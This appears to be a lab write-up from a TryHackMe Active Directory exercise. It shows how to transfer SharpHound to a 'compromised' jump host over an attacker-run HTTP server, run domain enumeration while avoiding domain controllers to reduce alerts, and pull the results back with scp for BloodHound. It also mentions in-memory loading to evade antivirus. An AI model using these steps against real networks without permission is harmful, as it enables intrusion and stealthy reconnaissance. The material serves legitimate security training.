
Bloodhound is the actual GUI used to display the AD attack graphs.

Bloodhound is the software that runs locally on an attacker's machine. The attacker must run a "collector" on a target where it will enumerate lots of information about the domain. After the collector finishes running, it will output a series of .json files for import into the attacker's Bloodhound interface.

Bloodhound is the GUI that allows us to import data captured by `Sharphound` and visualise it into attack paths. 

# Sharphound

You will often hear users refer to Sharphound and Bloodhound interchangeably. However, they are not the same. `Sharphound is the enumeration tool of Bloodhound.`

It is used to enumerate the AD information that can then be visually displayed in Bloodhound. 

Therefore, we first need to learn how to use Sharphound to enumerate AD before we can look at the results visually using Bloodhound.

There are three different Sharphound collectors:

1. `Sharphound.ps1`  - PowerShell script for running Sharphound. However, the latest release of Sharphound has stopped releasing the Powershell script 
                       version. This version is good to use with RATs since the script can be `loaded directly into memory, evading on-disk AV scans`.

2. `Sharphound.exe`  - A Windows executable version for running Sharphound.

3. `AzureHound.ps1`  - PowerShell script for `running Sharphound for Azure` (Microsoft Cloud Computing Services) instances. Bloodhound can ingest data 
                       enumerated from Azure `to find attack paths related to the configuration of Azure Identity and Access Management`.


When using these collector scripts on an assessment, there is a high likelihood that these files will be detected as malware and raise an alert to the blue team. 

This is again where our Windows machine that is non-domain-joined can assist. We can use the `runas` command to inject the AD credentials and point Sharphound to a Domain Controller. 

Since we control this Windows machine, we can either disable the AV or create exceptions for specific files or folders, which has already been performed for you on the THMJMP1 machine. 

You can find the Sharphound binaries on this host in the C:\Tools\ directory. We will use the SharpHound.exe version for our enumeration, but feel free to play around with the other two. We will execute Sharphound as follows:


`Sharphound.exe --CollectionMethods <Methods> --Domain za.tryhackme.com --ExcludeDCs`

- `CollectionMethods` - Determines what kind of data Sharphound would collect. The most common options are Default or All. Also, since Sharphound caches 
                        information, once the first run has been completed, you can only use the Session collection method to retrieve new user sessions to speed up the process.


- `Domain`            - Here, we specify the domain we want to enumerate. In some instances, you may want to enumerate a parent or other domain that has 
                        trust with your existing domain. You can tell Sharphound which domain should be enumerated by altering this parameter.

- `ExcludeDCs`        - This will instruct Sharphound not to touch domain controllers, which reduces the likelihood that the Sharphound run will raise an 
                        alert.

We are having SSH access to compromised machine

──(kali㉿kali)-[~]
└─$ `ssh za.tryhackme.com\\sian.gill@thmjmp1.za.tryhackme.com`
za.tryhackme.com\sian.gill@thmjmp1.za.tryhackme.com's password: 

Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

***********************************************************************************************************************************

# Downlaoding Sharphound

┌──(kali㉿kali)-[~]
└─$ `wget https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip`

# Trasfering it to compromised machine

┌──(kali㉿kali)-[~]
└─$ `sudo python3 -m http.server 80`
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...



za\sian.gill@THMJMP1 C:\Users\sian.gill>`powershell`
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\sian.gill> `Invoke-WebRequest http://10.50.47.247/SharpHound.exe -OutFile SharpHound.exe`
PS C:\Users\sian.gill> `dir`


    Directory: C:\Users\sian.gill


Mode                LastWriteTime         Length Name
----                -------------         ------ ----                                                                                                                                                                                     
d-r---        9/15/2018   8:19 AM                Desktop
d-r---        4/18/2024   3:29 PM                Documents
d-r---        9/15/2018   8:19 AM                Downloads
d-r---        9/15/2018   8:19 AM                Favorites
d-r---        9/15/2018   8:19 AM                Links
d-r---        9/15/2018   8:19 AM                Music
d-r---        9/15/2018   8:19 AM                Pictures
d-----        9/15/2018   8:19 AM                Saved Games
d-r---        9/15/2018   8:19 AM                Videos
-a----        4/18/2024   3:32 PM        2138953 SharpHound-v1.1
-a----        4/18/2024   3:48 PM        1051648 SharpHound.exe


PS C:\Users\sian.gill>  



# Now, we're ready to run the collector, sharphound.exe .




PS C:\Users\sian.gill> `.\SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs`
2024-04-18T15:50:35.9252996+01:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
2024-04-18T15:50:36.1283414+01:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-04-18T15:50:36.1439997+01:00|INFORMATION|Initializing SharpHound at 3:50 PM on 4/18/2024
2024-04-18T15:50:36.4270071+01:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-04-18T15:50:36.6301479+01:00|INFORMATION|Beginning LDAP search for za.tryhackme.com
2024-04-18T15:51:06.8100565+01:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 50 MB RAM
2024-04-18T15:51:23.5822612+01:00|INFORMATION|Producer has finished, closing LDAP channel
2024-04-18T15:51:23.6604123+01:00|INFORMATION|LDAP channel closed, waiting for consumers
2024-04-18T15:51:24.3322743+01:00|INFORMATION|Consumers finished, closing output channel
2024-04-18T15:51:24.3791321+01:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2024-04-18T15:51:24.8634706+01:00|INFORMATION|Status: 2159 objects finished (+2159 44.97917)/s -- Using 67 MB RAM
2024-04-18T15:51:24.8634706+01:00|INFORMATION|Enumeration finished in 00:00:48.2407829
2024-04-18T15:51:25.0822321+01:00|INFORMATION|Saving cache with stats: 2118 ID to type mappings.
 2121 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2024-04-18T15:51:25.0978570+01:00|INFORMATION|SharpHound Enumeration Completed at 3:51 PM on 4/18/2024! Happy Graphing!

PS C:\Users\sian.gill> `dir`


    Directory: C:\Users\sian.gill


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/15/2018   8:19 AM                Desktop
d-r---        4/18/2024   3:29 PM                Documents
d-r---        9/15/2018   8:19 AM                Downloads
d-r---        9/15/2018   8:19 AM                Favorites
d-r---        9/15/2018   8:19 AM                Links
d-r---        9/15/2018   8:19 AM                Music
d-r---        9/15/2018   8:19 AM                Pictures
d-----        9/15/2018   8:19 AM                Saved Games
d-r---        9/15/2018   8:19 AM                Videos
-a----        4/18/2024   3:51 PM         140547 20240418155122_BloodHound.zip
-a----        4/18/2024   3:32 PM        2138953 SharpHound-v1.1
-a----        4/18/2024   3:48 PM        1051648 SharpHound.exe
-a----        4/18/2024   3:51 PM         359354 YzE4MDdkYjAtYjc2MC00OTYyLTk1YTEtYjI0NjhiZmRiOWY1.bin


PS C:\Users\sian.gill>



# Now that the collector has finished running, we got a `20240418155122_BloodHound.zip` that we need to transfer back to Kali for analysis. we will use `SCP` to transfer the file.

SCP (Secure Copy Protocol) allows us copy file from remote to local using SSH

┌──(kali㉿kali)-[~]
└─$ `scp sian.gill@za.tryhackme.com@thmjmp1.za.tryhackme.com:C:/Users/sian.gill/20240418155122_BloodHound.zip .`
sian.gill@za.tryhackme.com@thmjmp1.za.tryhackme.com's password: 
20240418155122_BloodHound.zip  



This bloodhound zip file contains json files which are consumed by bloodhound to produce grph results

# Now lets anaylyse the bloohound.zip using BloodHound

Install Bloodhound from the apt repository with:

┌──(kali㉿kali)-[~]
└─$ `sudo apt update && sudo apt install -y bloodhound`

After installation completes, start neo4j with the following command:

┌──(kali㉿kali)-[~]
└─$ `sudo neo4j console`


Now we can use import zip file in bloodhound and see